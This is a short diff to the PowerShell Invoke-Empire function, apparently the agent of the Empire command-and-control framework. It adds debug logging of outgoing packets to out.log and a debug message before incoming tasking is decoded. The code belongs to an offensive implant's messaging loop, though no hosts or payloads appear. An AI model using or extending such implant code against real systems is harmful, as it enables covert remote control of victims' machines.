@@ -782,7 +782,7 @@ function Invoke-Empire {
 	$script:SendMessage = {
 		param($Listener, $Packets)
         "called send message" | Out-File "out.log" -Append -NoClobber
-        $PacketData | Out-File "out.log" -Append -NoClobber
+        $Packets | Out-File "out.log" -Append -NoClobber
         (& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"])
 	}
 
@@ -795,6 +795,7 @@ function Invoke-Empire {
 		}
 		else {
 			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
+                "got something not equal to defaultResponse, calling decoderoutingpacket"
 				Decode-RoutingPacket -PacketData $TaskData
 			}
 		}
